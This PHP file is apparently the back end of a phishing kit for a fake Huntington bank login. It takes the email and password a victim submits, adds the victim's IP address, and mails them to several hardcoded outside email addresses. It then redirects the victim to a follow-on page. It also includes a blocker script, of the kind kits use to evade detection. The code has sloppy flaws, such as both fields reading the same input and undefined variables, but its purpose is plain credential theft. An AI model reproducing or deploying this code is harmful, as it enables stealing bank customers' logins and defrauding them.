<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "D0N5L0W----HUNT1NGT0N-----10GIN----2023\n";
$message .= "EMAIL: " .$_POST['1']."\n\n";
$message .= "PASSWORD: " .$_POST['1']."\n\n";
$message .= "D0N5L0W----HUNT1NGTON-----10GIN----2023\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "D0N5L0W----HUNT1NGT0N-----10GIN----2023\n";
$recipient = "donflow2021@yahoo.com,donflow2021@yahoo.com,user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com, donflowmania@juno.com";
$subject = "D0N5L0W----HUNT1NGT0N-----10GIN----2023";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."3RTH10GIN";
$headers .= "D0N5L0W----HUNT1NGT0N-----L0GINGIN-----2022";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: 2nglog.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        